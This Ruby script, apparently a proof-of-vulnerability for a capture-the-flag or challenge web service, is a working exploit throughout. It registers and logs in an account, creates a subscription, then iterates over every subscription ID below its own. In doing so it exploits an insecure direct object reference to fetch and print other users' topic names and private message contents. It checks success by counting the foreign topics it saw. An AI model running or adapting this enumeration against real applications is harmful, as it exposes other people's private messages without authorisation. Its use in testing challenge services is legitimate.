#!/bin/env ruby

require "logger"

require 'securerandom'

require "mechanize"

LLL = Logger.new(STDERR,
                 formatter: proc do |sev, datetime, progname, msg|
                   "#{sev}: #{msg}\n"
                 end)

MAX_PIN =  0xffffffffffffffff

class Pov
  attr_reader :host, :port


  def initialize
    @host = ENV['HOST'] || 'challenge'
    @port = ENV['PORT'] || '3035'
  end

  def run!
    @slug = "pov_see_others_subs #{rand 1_000_000} #{Time.now.to_i}"

    Mechanize.start do |agent|
      agent.follow_redirect = true

      index = agent.get "http://#{@host}:#{@port}"
      signup_form = index.form_with id: 'new_user_form'
      signup_form['user[name]'] = @slug
      signup_form['user[password]'] = @slug
      signup_form['user[password_confirmation]'] = @slug

      after_create = signup_form.submit

      assert_equal('created user, please log in',
                   after_create.search('dd.info').text)

      login_form = after_create.form_with id: 'new_session_form'
      login_form['username'] = @slug
      login_form['password'] = @slug
      
      after_login = login_form.submit
      subscription_form = after_login.form_with action: '/subscriptions'
      subscription_form['subscription[topic][name]'] = @slug

      did_subscribe = subscription_form.submit
      sub_href = did_subscribe.
        search("td.subscription_topic_name:contains(\"#{@slug}\")").
        first.
        parent.
        search('td.actions a').
        first.
        attr('href')

      view_sub = did_subscribe.link_with(href: sub_href).click

      last_sub_path = view_sub.uri.path
      last_sub_id = last_sub_path.split('/').last.to_i

      seen_topics = Set.new

      heredoc = SecureRandom.uuid
      puts "PRIVDATA_HERE=#{heredoc}"

      (1..last_sub_id).each do |id|
        haxed_addr = view_sub.uri.dup
        haxed_addr.path = last_sub_path.gsub(/\d+$/, id.to_s)
        found_sub = agent.get haxed_addr rescue next
        
        topic_name = found_sub.
          search('h1').
          first.
          text.
          gsub('subscription to ', '')

        next if seen_topics.include? topic_name

        seen_topics << topic_name

        puts "# topic #{topic_name}"
        puts

        found_sub.
          search('#messages tbody tr').
          each do |row|
            puts row.search('.message_content').first.text
        end

        puts
      end

      puts heredoc

      if 1 >= seen_topics.length
        LLL.info "only saw #{seen_topics.length} topic, probably failed"
        exit 1
      end
    end
  end

  private

  def assert_equal(expected, actual)
    assert(expected == actual, "expected #{expected} to == #{actual}")
  end

  def assert(predicate, message='failed assertion')
    return if predicate
    fail message
  end
end

pov = Pov.new
at_exit do
  LLL.info((["ruby", $0] + ARGV).join(' '))
end
pov.run!

LLL.info "success :)"
